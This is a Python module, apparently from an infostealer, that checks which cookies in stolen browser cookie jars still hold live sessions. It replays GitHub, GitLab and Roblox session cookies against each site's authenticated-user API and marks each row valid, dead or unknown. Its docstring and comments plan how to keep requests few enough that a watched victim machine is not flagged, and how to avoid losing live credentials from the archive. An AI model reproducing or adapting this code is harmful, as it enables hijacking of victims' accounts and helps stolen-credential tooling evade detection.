"""What the cookie dump is worth, row by row.

The collectors hand back a browser's cookie jar, and most of a jar is not a session: rows that
expired last year, rows set by an analytics script, rows for a site the user logged out of. A
dump that says "4 812 cookies" and does not say which of them still open something is a number
dressed as a result. The reference set makes the point at 00:05:42 — it dumps raw, and a raw dump
is what a reader has to re-check by hand afterwards.

So every row gets asked one question, and the answer is one of three words, the same three
``identity`` uses for a token: ``valid``, ``dead``, ``unknown``.

**Two of the questions are free.** A row whose ``expires`` is in the past is dead by definition —
no request, no third party, nothing to go wrong. That is most rows in most jars, and it is the
half of this module that cannot be wrong. A row with an empty value is not a credential at all
and is left alone.

**The third question costs a request, so it is asked sparingly.** One request per known session
cookie, against the origin that set it, presented as the cookie it is. Three rules keep that from
becoming the thing that gets a host flagged:

- **Only cookies in ``CHECKS`` are tested.** A cookie name is not a session token because it looks
  like one, and guessing an endpoint for every row would be one request per row off a machine
  that is presumably being watched.
- **At most ``_MAX_CHECKS`` requests, inside one deadline, paced by ``identity``'s counter.**
  Pacing lives in one place for the whole run, so the burst a reader would see is the shape this
  run has rather than one shape per module.
- **The same value is tested once.** A cookie shared across two profiles is one credential and
  one request; the second row reads the verdict off the first.

**``dead`` only comes from a 401.** This is the rule that matters, and it is narrower than it
could be. ``403`` is what a WAF, a user-agent filter and a geoblock all return, and none of those
is a statement about the cookie. ``429`` and any 5xx are statements about the run. Reporting any
of them as ``dead`` would drop a live credential out of the archive, and the only copy left is on
a machine that is not coming back. ``identity`` already refuses that trade for tokens; the same
refusal applies here, so only ``401`` — the origin saying "not this credential" — is a death.

A row that was not tested keeps no verdict at all, and the four states stay distinguishable:
no ``status`` key means the row was never a candidate for a check, ``unknown`` means the check
was attempted and did not conclude.

**The table is short on purpose.** Each entry is a request to a third party, and each one has to
be an endpoint where a 401 can only mean the cookie is dead and no second credential is involved
(a bearer token of our own would turn a stale constant into a false death). GitHub, GitLab and
Roblox answer that description today. A missing entry costs nothing — the row simply stays
unmarked — while a wrong entry costs a live session, so the bar is "the refusal is unambiguous",
not "the site is popular".

The status file is ``accounts/cookie_status.json``: the same schema as
``accounts/session_status.json``, in the same directory, one file per kind of credential.
``cookies.json`` itself keeps the value where it was and gains ``status`` and ``reason`` beside it,
because the row is the thing a reader looks at.
"""

from __future__ import annotations

import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final, NamedTuple

from . import identity, log, util

STATUS_FILE: Final[str] = "cookie_status.json"

VALID: Final[str] = identity.VALID
DEAD: Final[str] = identity.DEAD
UNKNOWN: Final[str] = identity.UNKNOWN

# The gate is the collector's own flag. There is no separate toggle and no way to enable this
# on a run that collected no browsers: the files this walks are written by that collector.
_FLAG: Final[str] = "browsers"

# Rows expire for free, so scanning is cheap. Requests are not: six is already six hosts a
# minute on a machine that loaded no pages, and a jar with more than six checkable session
# cookies is a machine that logged into more services than one run needs to prove.
_MAX_CHECKS: Final[int] = 6
_DEADLINE: Final[float] = 6.0

# A cookies.json the readers produce is at most a few thousand rows; anything past this is a
# file that is not one, and iterating it would be work with no result.
_MAX_ROWS: Final[int] = 5000


class Check(NamedTuple):
    """One cookie name that can be asked about, and the endpoint that answers.

    ``reason`` is documentation rather than data: it says why a 401 from this endpoint is a
    statement about the cookie and nothing else, which is the test every new entry has to pass.
    """

    platform: str
    host: str
    name: str
    endpoint: str
    reason: str


CHECKS: Final[tuple[Check, ...]] = (
    Check(
        "github",
        "github.com",
        "user_session",
        "https://api.github.com/user",
        "the web session cookie is one of the two ways this endpoint authenticates, it needs no "
        "bearer of ours, and an invalid session answers 401 rather than a login page",
    ),
    Check(
        "gitlab",
        "gitlab.com",
        "_gitlab_session",
        "https://gitlab.com/api/v4/user",
        "session is server-side and keyed by the cookie alone; anonymous is a 401 on /api/v4",
    ),
    Check(
        "roblox",
        "roblox.com",
        ".ROBLOSECURITY",
        "https://users.roblox.com/v1/users/authenticated",
        "the same endpoint identity uses for the plaintext session file, and an invalid cookie "
        "is a 401 rather than a redirect",
    ),
)


def _enabled(cfg: Any) -> bool:
    """True when the browser collector ran. Everything below reads what it wrote."""
    sources = getattr(cfg, "sources", None)
    if sources is None:
        return False
    return bool(getattr(sources, _FLAG, False))


def _host_matches(host: str, suffix: str) -> bool:
    """Cookie hosts arrive as ``.github.com``, ``github.com`` or a subdomain of either."""
    cleaned = host.strip().lower().lstrip(".")
    if not cleaned:
        return False
    return cleaned == suffix or cleaned.endswith("." + suffix)


def _check_for(host: str, name: str) -> Check | None:
    for check in CHECKS:
        if check.name == name and _host_matches(host, check.host):
            return check
    return None


def _expired(value: Any, now: datetime) -> bool:
    """True when the row carries an expiry and that moment has passed.

    An unparseable expiry is not an expiry. Guessing here would mark a live session dead on the
    strength of a bad date, which is the same mistake as reading a 403 as a refusal.
    """
    if not isinstance(value, str) or not value:
        return False
    stamp = value[:-1] + "+00:00" if value.endswith("Z") else value
    try:
        moment = datetime.fromisoformat(stamp)
    except ValueError:
        return False
    if moment.tzinfo is None:
        moment = moment.replace(tzinfo=UTC)
    return moment <= now


def _verdict(reply: Any) -> tuple[str, str]:
    """The three words, from one reply. ``dead`` only on a 401 — see the module docstring."""
    if reply.error:
        return UNKNOWN, str(reply.error)
    if reply.status == 200:
        return VALID, ""
    if reply.status == 401:
        return DEAD, "unauthorized"
    if reply.status == 429:
        return UNKNOWN, "rate_limited"
    if reply.status >= 500:
        return UNKNOWN, "server_error"
    if reply.status:
        return UNKNOWN, f"status_{reply.status}"
    return UNKNOWN, "failed"


def _probe(check: Check, value: str, deadline: float) -> tuple[str, str]:
    headers = {
        "Cookie": f"{check.name}={value}",
        "User-Agent": identity._USER_AGENT,
        "Accept": "application/json",
    }
    # The pacing counter, the per-call ceiling and the deadline arithmetic are one policy and
    # they live in ``identity``. A second copy here would be a second counter, and two counters
    # is exactly the burst the pacing is meant to prevent.
    return _verdict(identity._request(check.endpoint, headers, deadline))


class _Seen:
    """Verdicts already reached in this run, keyed by the credential rather than the row.

    A session cookie copied between two profiles is one credential. Asking twice spends a
    request on a question that has already been answered, and the second answer cannot improve
    on the first.
    """

    def __init__(self) -> None:
        self._verdicts: dict[tuple[str, str], tuple[str, str]] = {}

    def get(self, name: str, value: str) -> tuple[str, str] | None:
        return self._verdicts.get((name, value))

    def put(self, name: str, value: str, verdict: tuple[str, str]) -> None:
        self._verdicts[(name, value)] = verdict


def _source_label(path: Path, root: Path) -> str:
    try:
        return path.parent.relative_to(root).as_posix()
    except ValueError:
        return path.parent.name


def validate(root: Path, cfg: Any) -> int:
    """Mark what the jars are worth. Returns rows with a verdict, never raises."""
    try:
        return _validate(root, cfg)
    except Exception:
        # Optional extra on a run that has already produced its archive. A failure here is a
        # debug line, never a reason to lose the collection.
        log.logger.debug("cookies: validation failed", exc_info=True)
        return 0


def _validate(root: Path, cfg: Any) -> int:
    if not _enabled(cfg):
        return 0

    jars = sorted((root / "browsers").glob("*/*/cookies.json"))
    if not jars:
        return 0

    now = datetime.now(UTC)
    deadline = time.monotonic() + _DEADLINE
    seen = _Seen()
    rows: list[dict[str, Any]] = []
    written = 0
    requests = 0

    for jar in jars:
        entries = util.read_json(jar)
        if not isinstance(entries, list):
            continue

        changed = False
        for entry in entries[:_MAX_ROWS]:
            if not isinstance(entry, dict):
                continue
            name = entry.get("name")
            value = entry.get("value")
            if not isinstance(name, str) or not isinstance(value, str) or not value:
                continue

            verdict: tuple[str, str] | None = None
            kind = "expiry"

            if _expired(entry.get("expires"), now):
                # Free, exact, and the largest class of row in most jars.
                verdict = (DEAD, "expired")
            else:
                check = _check_for(str(entry.get("host") or ""), name)
                if check is None:
                    continue
                kind = check.platform
                verdict = seen.get(name, value)
                if verdict is None:
                    if requests >= _MAX_CHECKS or time.monotonic() >= deadline:
                        # Out of budget. The row keeps no verdict: "not asked" is not "unknown".
                        continue
                    requests += 1
                    verdict = _probe(check, value, deadline)
                    seen.put(name, value, verdict)

            entry["status"] = verdict[0]
            if verdict[1]:
                entry["reason"] = verdict[1]
            else:
                entry.pop("reason", None)
            changed = True
            written += 1
            rows.append(
                {
                    "kind": kind,
                    "host": str(entry.get("host") or ""),
                    "name": name,
                    "status": verdict[0],
                    **({"reason": verdict[1]} if verdict[1] else {}),
                    "source": _source_label(jar, root),
                }
            )

        if changed and not util.write_json(jar, entries):
            log.logger.debug("cookies: no verdicts written back to %s", jar.name)

    if not rows:
        return 0

    counts = {VALID: 0, DEAD: 0, UNKNOWN: 0}
    for row in rows:
        counts[row["status"]] = counts.get(row["status"], 0) + 1

    document = {
        "schema": 1,
        "deadline_seconds": _DEADLINE,
        "requests": requests,
        "counts": counts,
        "rows": rows,
    }
    util.write_json(root / "accounts" / STATUS_FILE, document)
    log.logger.debug(
        "cookies: %d rows marked, %d requests, %d valid, %d dead, %d unknown",
        written,
        requests,
        counts[VALID],
        counts[DEAD],
        counts[UNKNOWN],
    )
    return written


__all__ = ["CHECKS", "DEAD", "STATUS_FILE", "UNKNOWN", "VALID", "validate"]
